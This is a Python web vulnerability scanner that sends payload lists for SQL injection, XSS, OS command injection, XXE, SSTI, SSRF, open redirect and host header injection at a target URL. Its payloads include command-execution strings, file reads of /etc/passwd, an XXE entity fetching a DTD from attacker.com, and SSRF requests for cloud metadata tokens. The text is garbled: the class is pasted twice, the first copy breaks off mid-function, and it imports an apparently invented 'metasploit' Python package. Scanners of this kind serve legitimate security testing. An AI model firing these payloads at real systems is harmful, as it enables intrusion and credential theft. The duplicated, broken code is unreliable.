import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urlparse, parse_qs, urljoin, quote, unquote
import hashlib
import base64
import random
import string
import json
import socket
import os
import uuid
import dns.resolver
import whois
import concurrent.futures
import time
from typing import List, Dict, Any, Optional
from requests.exceptions import RequestException, Timeout
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
import ssl
import subprocess
import ipaddress
import jwt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from xml.etree.ElementTree import fromstring, ParseError
import yaml
from jinja2 import Environment, FileSystemLoader
import logging
import argparse
from tqdm import tqdm

# Metasploit modules
from metasploit import module
from metasploit.module import ModuleType
from metasploit.module.payload import Payload
from metasploit.module.exploit import Exploit
from metasploit.module.auxiliary import Auxiliary
from metasploit.module.post import Post
from metasploit.module.encoder import Encoder

# Suppress only the single InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class VulnerabilityScanner:
    def __init__(self, target_url: str, concurrency: int = 10, timeout: int = 10, verbose: bool = True):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.generate_random_user_agent()})
        self.timeout = timeout
        self.max_retries = 3
        self.concurrent_requests = concurrency
        self.verbose = verbose
        self.custom_payloads = self.load_custom_payloads()
        self.custom_wordlist = self.load_custom_wordlist()
        self.results = []

    def load_custom_payloads(self) -> List[str]:
        try:
            with open('custom_payloads.txt', 'r') as f:
                return [line.strip() for line in f]
        except FileNotFoundError:
            logger.warning("custom_payloads.txt not found. Using default payloads.")
            return []

    def load_custom_wordlist(self) -> List[str]:
        try:
            with open('custom_wordlist.txt', 'r') as f:
                return [line.strip() for line in f]
        except FileNotFoundError:
            logger.warning("custom_wordlist.txt not found. Using default wordlist.")
            return []

    def _make_request(self, url: str, method: str = 'GET', data: Dict[str, Any] = None, 
                      headers: Dict[str, str] = None, allow_redirects: bool = True) -> Optional[requests.Response]:
        """Make an HTTP request with retry mechanism and error handling."""
        for attempt in range(self.max_retries):
            try:
                response = self.session.request(
                    method=method,
                    url=url,
                    data=data,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=allow_redirects,
                    verify=False  # Disable SSL verification
                )
                response.raise_for_status()
                return response
            except (RequestException, Timeout) as e:
                if attempt == self.max_retries - 1:
                    logger.error(f"Request failed for {url}: {e}")
                    return None
                time.sleep(2 ** attempt)  # Exponential backoff
        return None

    def _log_info(self, message: str):
        """Log informational messages."""
        if self.verbose:
            logger.info(f"{Fore.CYAN}{message}{Style.RESET_ALL}")

    def _log_warning(self, message: str):
        """Log warning messages."""
        if self.verbose:
            logger.warning(f"{Fore.YELLOW}{message}{Style.RESET_ALL}")

    def _log_error(self, message: str):
        """Log error messages."""
        if self.verbose:
            logger.error(f"{Fore.RED}{message}{Style.RESET_ALL}")

    def _log_success(self, message: str):
        """Log success messages."""
        if self.verbose:
            logger.info(f"{Fore.GREEN}{message}{Style.RESET_ALL}")

    def _log_vulnerability(self, vuln_type: str, url: str, details: str = ""):
        """Log detected vulnerabilities."""
        vuln_info = {
            "type": vuln_type,
            "url": url,
            "details": details
        }
        self.results.append(vuln_info)
        self._log_success(f"{vuln_type} vulnerability found in {url}")
        if details:
            logger.info(f"Details: {details}")

    def _check_vulnerability(self, url: str, payloads: List[str], 
                             detect_patterns: List[str], vuln_type: str):
        """Generic vulnerability checking method."""
        self._log_info(f"Scanning for {vuln_type} vulnerabilities: {url}")
        
        original_response = self._make_request(url)
        if not original_response:
            return

        for payload in payloads:
            try:
                modified_url = f"{url}{payload}"
                response = self._make_request(modified_url)
                
                if not response:
                    continue

                response_text = response.text.lower()
                original_text = original_response.text.lower()

                # Check for significant changes in response
                if response.status_code != original_response.status_code:
                    self._log_vulnerability(vuln_type, url, f"Status code changed from {original_response.status_code} to {response.status_code}")
                
                # Check for error messages or specific patterns
                for pattern in detect_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        if not re.search(pattern, original_text, re.IGNORECASE):
                            self._log_vulnerability(vuln_type, url, f"Detected pattern: {pattern}")
                
                # Check for significant increase in response length
                if len(response.content) > len(original_response.content) * 1.5:
                    self._log_vulnerability(vuln_type, url, "Significant increase in response length")

            except Exception as e:
                self._log_error(f"Error checking {vuln_type} for {modified_url}: {e}")

    def sql_injection_check(self, url: str):
        """Check for SQL injection vulnerabilities."""
        payloads = [
            "'", 
            "\"", 
            "1' OR '1'='1", 
            "1\" OR \"1\"=\"1", 
            "' OR 1=1--", 
            "\" OR 1=1--", 
            "' OR '1'='1", 
            "\" OR \"1\"=\"1", 
            "') OR ('1'='1", 
            "\") OR (\"1\"=\"1", 
            "1 UNION SELECT NULL--", 
            "1 UNION SELECT 1,2,3--", 
            "1' UNION SELECT NULL,NULL,NULL--", 
            "1\" UNION SELECT NULL,NULL,NULL--",
            "1) UNION SELECT NULL,NULL,NULL--",
            "1')) UNION SELECT NULL,NULL,NULL--",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' AND 1=1--",
            "1' AND 1=0--",
            "1' HAVING 1=1--",
            "1' HAVING 1=0--",
            "1' ORDER BY 1--",
            "1' ORDER BY 1000--",
            "1' GROUP BY 1--",
            "1' GROUP BY 1,2,3--",
            "') UNION SELECT @@version--",
            "' UNION SELECT NULL,@@version--",
            "' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5(1))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            "1' AND (SELECT COUNT(*) FROM sysusers)>0--"
        ] + self.custom_payloads
        detect_patterns = [
            "sql syntax",
            "mysql_fetch_array()",
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "microsoft ole db provider for odbc drivers error",
            "microsoft ole db provider for sql server",
            "incorrect syntax near",
            "unexpected end of sql command",
            "invalid query",
            "sql command not properly ended",
            "error in your sql syntax",
            "invalid sql statement",
            "sqlexception",
            "java.sql.sqlexception",
            "ora-01756: quoted string not properly terminated",
            "pg::syntaxerror: error:",
            "sqlite3::exception:",
            "odbc driver.*sql server",
            "postgresql query failed:",
            "db2 sql error:",
            "microsoft access driver",
            "oracle error",
            "ibm db2 sql error",
            "sybase message:",
            "mariadb server version for the right syntax"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "SQL Injection")

    def xss_check(self, url: str):
        """Check for Cross-Site Scripting (XSS) vulnerabilities."""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "><script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>",
            "'; alert('XSS');//",
            "\"; alert('XSS');//",
            "' onclick=alert('XSS');//",
            "\" onclick=alert('XSS');//",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<img src=x:alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onchange=alert('XSS')><option>1</option><option>2</option></select>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
            "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
            "<iframe src='javascript:alert(`XSS`)'>",
            "<math><a xlink:href=\"javascript:alert('XSS')\">click",
            "<table background=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">click",
            "<div style=\"background-image:url(javascript:alert('XSS'))\">",
            "<div style=\"width:expression(alert('XSS'))\">",
            "<style>@import 'javascript:alert(\"XSS\")';</style>",
            "<x onclick=\"alert('XSS')\">click",
            "<script>onerror=alert;throw 'XSS'</script>",
            "<script>{onerror=alert}throw 'XSS'</script>",
            "<marquee onstart=alert('XSS')>",
            "<details ontoggle=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>0</meter>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ] + self.custom_payloads
        detect_patterns = [
            "<script>alert('XSS')</script>",
            "alert('XSS')",
            "alert(\"XSS\")",
            "alert`XSS`",
            "on(load|error|focus|click)\\s*=",
            "javascript:",
            "data:text/html",
            "<svg",
            "<img",
            "<iframe",
            "xss",
            "alert\\(",
            "String\\.fromCharCode",
            "eval\\(",
            "fromCharCode",
            "onmouseover",
            "onfocus",
            "onerror",
            "onload",
            "onclick",
            "onsubmit"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "Cross-Site Scripting (XSS)")

    def os_command_injection_check(self, url: str):
        """Check for OS Command Injection vulnerabilities."""
        payloads = [
            "; ls -la",
            "& dir",
            "| cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 3 127.0.0.1",
            "| net user",
            "& type C:\\Windows\\win.ini",
            "; uname -a",
            "| id",
            "& whoami",
            "; cat /proc/version",
            "| ver",
            "& echo %USERNAME%",
            "; env",
            "| set",
            "& ps -ef",
            "; netstat -an",
            "| ipconfig /all",
            "& ifconfig",
            "; echo 'vulnerable' > test.txt",
            "| echo 'vulnerable' > test.txt",
            "& echo 'vulnerable' > test.txt",
            "; rm test.txt",
            "| del test.txt",
            "& rm test.txt",
            "$(touch /tmp/test)",
            "`touch /tmp/test`",
            "| touch /tmp/test",
            "; touch /tmp/test",
            "& echo %PATH%",
            "| echo $PATH",
            "; echo $PATH",
            "& systeminfo",
            "| sysctl -a",
            "; sysctl -a",
            "& powershell Get-Process",
            "| ps aux",
            "; ps aux",
            "& net localgroup administrators",
            "| cat /etc/group",
            "; cat /etc/group"
        ] + self.custom_payloads
        detect_patterns = [
            "root:x:",
            "\\[font\\]",
            "uid=",
            "gid=",
            "groups=",
            "Linux",
            "Windows",
            "BSD",
            "GNU",
            "Darwin",
            "build",
            "version",
            "inet addr:",
            "IP Address",
            "Ethernet adapter",
            "LISTEN",
            "ESTABLISHED",
            "vulnerable",
            "Directory of",
            "Volume Serial Number",
            "Processor\\(s\\)",
            "System uptime",
            "PID",
            "COMMAND",
            "Administrator",
            "root:",
            "/bin/bash"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "OS Command Injection")

    def xxe_check(self, url: str):
        """Check for XML External Entity (XXE) vulnerabilities."""
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&send;</data>',
            '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><replace>&xxe;</replace>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>',
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "https://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>&xxe;</foo>'
        ] + self.custom_payloads
        detect_patterns = [
            "root:x:",
            "\\[font\\]",
            "\\[extensions\\]",
            "uid=",
            "gid=",
            "groups=",
            "<\\?php",
            "HTTP_USER_AGENT",
            "HTTP_ACCEPT",
            "HTTP_HOST",
            "file:///",
            "php://filter",
            "expect://",
            "data://text/plain",
            "SYSTEM",
            "<!ENTITY",
            "<!DOCTYPE",
            "<!ELEMENT"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "XML External Entity (XXE)")

    def cors_misconfig_check(self, url: str):
        """Check for CORS misconfiguration."""
        self._log_info(f"Checking for CORS misconfiguration: {url}")
        try:
            headers = {'Origin': 'https://evil.com'}
            response = self._make_request(url, headers=headers)
            if not response:
                return

            if 'Access-Control-Allow-Origin' in response.headers:
                if response.headers['Access-Control-Allow-Origin'] == '*':
                    self._log_vulnerability("CORS Misconfiguration", url, "Access-Control-Allow-Origin set to wildcard (*)")
                elif response.headers['Access-Control-Allow-Origin'] == 'https://evil.com':
                    self._log_vulnerability("CORS Misconfiguration", url, "Access-Control-Allow-Origin reflects arbitrary origin")
                else:
                    self._log_success(f"CORS seems to be properly configured on {url}")
            else:
                self._log_info(f"No CORS headers found on {url}")
        except Exception as e:
            self._log_error(f"Error checking CORS configuration for {url}: {e}")

    def host_header_injection_check(self, url: str):
        """Check for Host Header Injection vulnerabilities."""
        self._log_info(f"Checking for Host Header Injection: {url}")
        try:
            original_response = self._make_request(url)
            if not original_response:
                return

            malicious_hosts = [
                'evil.com',
                '127.0.0.1',
                'localhost',
                'evil.com:80',
                'evil.com:443'
            ]

            for host in malicious_hosts:
                headers = {'Host': host}
                response = self._make_request(url, headers=headers)
                if not response:
                    continue

                if response.text != original_response.text:
                    self._log_vulnerability("Host Header Injection", url, f"Different response with Host: {host}")
                
                if 'Location' in response.headers:
                    if host in response.headers['Location']:
                        self._log_vulnerability("Host Header Injection", url, f"Reflected in Location header with Host: {host}")

        except Exception as e:
            self._log_error(f"Error checking Host Header Injection for {url}: {e}")

    def ssti_check(self, url: str):
        """Check for Server-Side Template Injection (SSTI) vulnerabilities."""
        payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
            "{{dump(app)}}",
            "{{app.request.server.all|join(',')}}",
            "{{config.items()}}",
            "{{ [].class.base.subclasses() }}",
            "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}",
            "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
            "{{''.__class__.mro()[1].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        ] + self.custom_payloads
        detect_patterns = [
            "49",
            "7\\*7",
            "eval",
            "exec",
            "subprocess",
            "os\\.",
            "popen",
            "read\\(\\)",
            "uid=",
            "gid=",
            "groups=",
            "Linux",
            "Windows"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "Server-Side Template Injection (SSTI)")

    def ssrf_check(self, url: str):
        """Check for Server-Side Request Forgery (SSRF) vulnerabilities."""
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",  # Google Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "https://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/metadata/v1/maintenance",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "file:///etc/passwd",
            "file://C:/Windows/win.ini",
            "gopher://localhost:3306/_",
            "dict://localhost:11211/stat",
            "ftp://localhost/",
            "https://localhost:443/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]",
            "http://127.127.127.127",
            "http://127.0.0.0",
            "http://2130706433",  # Decimal representation of 127.0.0.1
            "http://0x7f000001",  # Hex representation of 127.0.0.1
            "http://017700000001",  # Octal representation of 127.0.0.1
            "http://0",
            "http://0.0.0.0:22",
            "http://0177.0000.0000.0001",
            "http://[::]:22",
            "http://[::]",
            "http://0000::1:22",
            "http://[0:0:0:0:0:ffff:127.0.0.1]:22",
            "http://①②⑦.⓪.⓪.①"
        ] + self.custom_payloads
        detect_patterns = [
            "root:x:",
            "\\[font\\]",
            "\\[extensions\\]",
            "uid=",
            "gid=",
            "groups=",
            "LISTEN",
            "ESTABLISHED",
            "computeMetadata",
            "ami-id",
            "instance-id",
            "accountId"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "Server-Side Request Forgery (SSRF)")

    def open_redirect_check(self, url: str):
        """Check for open redirect vulnerabilities."""
        self._log_info(f"Checking for open redirect vulnerability: {url}")
        payloads = [
            "//evil.com",
            "https://evil.com",
            "//google.com%2f@evil.com",
            "https://evil.com/fake-login",
            "//evil.com/fake-login",
            "/\/\evil.com",
            "\/\/evil.com",
            "https:evil.com",
            "http:evil.com",
            "https:\\evil.com",
            "http:\\evil.com",
            "//evil%E3%80%82com",
            "\\evil.com",
            "http://evil.com",
            "https://evil.com",
            "https://evil.com%2f%2f",
            "//evil%00.com",
            "https://evil%E3%80%82com"
        ] + self.custom_payloads
        
        try:
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            for payload in payloads:
                test_url = f"{url}?redirect={quote(payload)}"
                response = self._make_request(test_url, allow_redirects=False)
                
                if response and response.is_redirect:
                    location = response.headers.get('Location', '')
                    if any(evil_domain in location.lower() for evil_domain in ['evil.com', 'google.com']):
                        self._log_vulnerability("Open Redirect", url, f"Possible open redirect found with payload: {payload}")
                        return
            
            self._log_success(f"No open redirect vulnerability found on {url}")
        except Exception as e:
            self._log_error(f"Error checking for open redirect on {url}: {e}")

    def generate_random_string(self, length=10):
        """Generate a random string of given length."""
        letters_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_digits) for _ in range(length))

    def generate_random_email(self):
        """Generate a random email address."""
        username = self.generate_random_string(8)
        domain = random.choice(['example.com', 'test.com', 'domain.com'])
        return f"{username}@{domain}"

    def hash_string(self, input_string, algorithm='sha256'):
        """Hash a string using specified algorithm (default: SHA-256)."""
        if algorithm == 'md5':
            return hashlib.md5(input_string.encode()).hexdigest()
        elif algorithm == 'sha256':
            return hashlib.sha256(input_string.encode()).hexdigest()
        else:
            raise ValueError(f"Unsupported hashing algorithm: {algorithm}")

    def encode_base64(self, input_string):
        """Encode a string to base64."""
        return base64.b64encode(input_string.encode()).decode()

    def decode_base64(self, encoded_string):
        """Decode a base64 encoded string."""
        return base64.b64decode(encoded_string).decode()
    
    def encode_url(self, input_url):
        """Encode a URL fully."""
        return quote(input_url, safe='/:?=&')

    def decode_url(self, encoded_url):
        """Decode a fully encoded URL."""
        return unquote(encoded_url)

    def parse_url(self, url):
        """Parse URL into components."""
        parsed_url = urlparse(url)
        return {
            'scheme': parsed_url.scheme,
            'netloc': parsed_url.netloc,
            'path': parsed_url.path,
            'params': parsed_url.params,
            'query': parsed_url.query,
            'fragment': parsed_url.fragment
        }

    def build_url(self, base_url, path='', params=None):
        """Build a URL from base URL, optional path, and query parameters."""
        parsed_base_url = urlparse(base_url)
        if params:
            parsed_params = '&'.join([f"{key}={value}" for key, value in params.items()])
            return urljoin(base_url, f"{parsed_base_url.path}/{path}?{parsed_params}")
        else:
            return urljoin(base_url, f"{parsed_base_url.path}/{path}")

    def parse_query_params(self, url):
        """Parse query parameters from URL."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        return {key: value[0] for key, value in query_params.items()}

    def json_to_dict(self, json_string):
        """Convert JSON string to Python dictionary."""
        try:
            return json.loads(json_string)
        except json.JSONDecodeError as e:
import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urlparse, parse_qs, urljoin, quote, unquote
import hashlib
import base64
import random
import string
import json
import socket
import os
import uuid
import dns.resolver
import whois
import concurrent.futures
import time
from typing import List, Dict, Any, Optional
from requests.exceptions import RequestException, Timeout
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
import ssl
import subprocess
import ipaddress
import jwt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from xml.etree.ElementTree import fromstring, ParseError
import yaml
from jinja2 import Environment, FileSystemLoader
import logging
import argparse
from tqdm import tqdm

# Suppress only the single InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class VulnerabilityScanner:
    def __init__(self, target_url: str, concurrency: int = 10, timeout: int = 10, verbose: bool = True):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.generate_random_user_agent()})
        self.timeout = timeout
        self.max_retries = 3
        self.concurrent_requests = concurrency
        self.verbose = verbose
        self.custom_payloads = self.load_custom_payloads()
        self.custom_wordlist = self.load_custom_wordlist()
        self.results = []

    def load_custom_payloads(self) -> List[str]:
        try:
            with open('custom_payloads.txt', 'r') as f:
                return [line.strip() for line in f]
        except FileNotFoundError:
            logger.warning("custom_payloads.txt not found. Using default payloads.")
            return []

    def load_custom_wordlist(self) -> List[str]:
        try:
            with open('custom_wordlist.txt', 'r') as f:
                return [line.strip() for line in f]
        except FileNotFoundError:
            logger.warning("custom_wordlist.txt not found. Using default wordlist.")
            return []

    def _make_request(self, url: str, method: str = 'GET', data: Dict[str, Any] = None, 
                      headers: Dict[str, str] = None, allow_redirects: bool = True) -> Optional[requests.Response]:
        """Make an HTTP request with retry mechanism and error handling."""
        for attempt in range(self.max_retries):
            try:
                response = self.session.request(
                    method=method,
                    url=url,
                    data=data,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=allow_redirects,
                    verify=False  # Disable SSL verification
                )
                response.raise_for_status()
                return response
            except (RequestException, Timeout) as e:
                if attempt == self.max_retries - 1:
                    logger.error(f"Request failed for {url}: {e}")
                    return None
                time.sleep(2 ** attempt)  # Exponential backoff
        return None

    def _log_info(self, message: str):
        """Log informational messages."""
        if self.verbose:
            logger.info(f"{Fore.CYAN}{message}{Style.RESET_ALL}")

    def _log_warning(self, message: str):
        """Log warning messages."""
        if self.verbose:
            logger.warning(f"{Fore.YELLOW}{message}{Style.RESET_ALL}")

    def _log_error(self, message: str):
        """Log error messages."""
        if self.verbose:
            logger.error(f"{Fore.RED}{message}{Style.RESET_ALL}")

    def _log_success(self, message: str):
        """Log success messages."""
        if self.verbose:
            logger.info(f"{Fore.GREEN}{message}{Style.RESET_ALL}")

    def _log_vulnerability(self, vuln_type: str, url: str, details: str = ""):
        """Log detected vulnerabilities."""
        vuln_info = {
            "type": vuln_type,
            "url": url,
            "details": details
        }
        self.results.append(vuln_info)
        self._log_success(f"{vuln_type} vulnerability found in {url}")
        if details:
            logger.info(f"Details: {details}")

    def _check_vulnerability(self, url: str, payloads: List[str], 
                             detect_patterns: List[str], vuln_type: str):
        """Generic vulnerability checking method."""
        self._log_info(f"Scanning for {vuln_type} vulnerabilities: {url}")
        
        original_response = self._make_request(url)
        if not original_response:
            return

        for payload in payloads:
            try:
                modified_url = f"{url}{payload}"
                response = self._make_request(modified_url)
                
                if not response:
                    continue

                response_text = response.text.lower()
                original_text = original_response.text.lower()

                # Check for significant changes in response
                if response.status_code != original_response.status_code:
                    self._log_vulnerability(vuln_type, url, f"Status code changed from {original_response.status_code} to {response.status_code}")
                
                # Check for error messages or specific patterns
                for pattern in detect_patterns:
                    if re.search(pattern, response_text, re.IGNORECASE):
                        if not re.search(pattern, original_text, re.IGNORECASE):
                            self._log_vulnerability(vuln_type, url, f"Detected pattern: {pattern}")
                
                # Check for significant increase in response length
                if len(response.content) > len(original_response.content) * 1.5:
                    self._log_vulnerability(vuln_type, url, "Significant increase in response length")

            except Exception as e:
                self._log_error(f"Error checking {vuln_type} for {modified_url}: {e}")

    def sql_injection_check(self, url: str):
        """Check for SQL injection vulnerabilities."""
        payloads = [
            "'", 
            "\"", 
            "1' OR '1'='1", 
            "1\" OR \"1\"=\"1", 
            "' OR 1=1--", 
            "\" OR 1=1--", 
            "' OR '1'='1", 
            "\" OR \"1\"=\"1", 
            "') OR ('1'='1", 
            "\") OR (\"1\"=\"1", 
            "1 UNION SELECT NULL--", 
            "1 UNION SELECT 1,2,3--", 
            "1' UNION SELECT NULL,NULL,NULL--", 
            "1\" UNION SELECT NULL,NULL,NULL--",
            "1) UNION SELECT NULL,NULL,NULL--",
            "1')) UNION SELECT NULL,NULL,NULL--",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "1' AND 1=1--",
            "1' AND 1=0--",
            "1' HAVING 1=1--",
            "1' HAVING 1=0--",
            "1' ORDER BY 1--",
            "1' ORDER BY 1000--",
            "1' GROUP BY 1--",
            "1' GROUP BY 1,2,3--",
            "') UNION SELECT @@version--",
            "' UNION SELECT NULL,@@version--",
            "' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5(1))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            "1' AND (SELECT COUNT(*) FROM sysusers)>0--"
        ] + self.custom_payloads
        detect_patterns = [
            "sql syntax",
            "mysql_fetch_array()",
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "microsoft ole db provider for odbc drivers error",
            "microsoft ole db provider for sql server",
            "incorrect syntax near",
            "unexpected end of sql command",
            "invalid query",
            "sql command not properly ended",
            "error in your sql syntax",
            "invalid sql statement",
            "sqlexception",
            "java.sql.sqlexception",
            "ora-01756: quoted string not properly terminated",
            "pg::syntaxerror: error:",
            "sqlite3::exception:",
            "odbc driver.*sql server",
            "postgresql query failed:",
            "db2 sql error:",
            "microsoft access driver",
            "oracle error",
            "ibm db2 sql error",
            "sybase message:",
            "mariadb server version for the right syntax"
        ]
        self._check_vulnerability(url, payloads, detect_patterns, "SQL Injection")

    def xss_check(self, url: str):
        """Check for Cross-Site Scripting (XSS) vulnerabilities."""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "><script>alert('XSS')</script>",
            "</script><script>alert('XSS')</script>",
            "'; alert('XSS');//",
            "\"; alert('XSS');//",
            "' onclick=alert('XSS');//",
            "\" onclick=alert('XSS');//",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<img src=x:alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onchange=alert('XSS')><option>1</option><option>2</option></select>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
            "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
            "<iframe src='javascript:alert(`XSS`)'>",
            "<math><a xlink:href=\"javascript:alert('XSS')\">click",
            "<table background=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">click",
            "<div style=\"background-image:url(javascript:alert('XSS'))\">",
            "<div style=\"width:expression(alert('XSS'))\">",
            "<style>@import 'javascript:alert(\"XSS\")';</style>",
            "<x onclick=\"alert('XSS')\">click",
            "<script>onerror=alert;throw 'XSS'</script>",
            "<script>{onerror=alert}throw 'XSS'</script>",
            "<marquee onstart=alert('XSS')>",
            "<details ontoggle=alert('XSS')>",
            "<meter onmouseover=alert('XSS')>0</meter>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ] + self.custom_payloads
        detect_patterns = [
            "<script>alert('XSS')</script>",
            "alert('XSS')",
            "alert(\"XSS\")",
            "alert`XSS`",
            "on(load|error|focus|click)\\s*=",
            "javascript:",
            "data:text/html",
            "<svg",
            "<img",
            "<iframe",
            "xss",
            "alert\\(",
            "String\\.fromCharCode",
            "eval\\(",
            "fromCharCode",
            "onmouseover",
            "onfocus",
            "onerror",
            "onload",
            "onclick",
            "onsubmit"
        ]
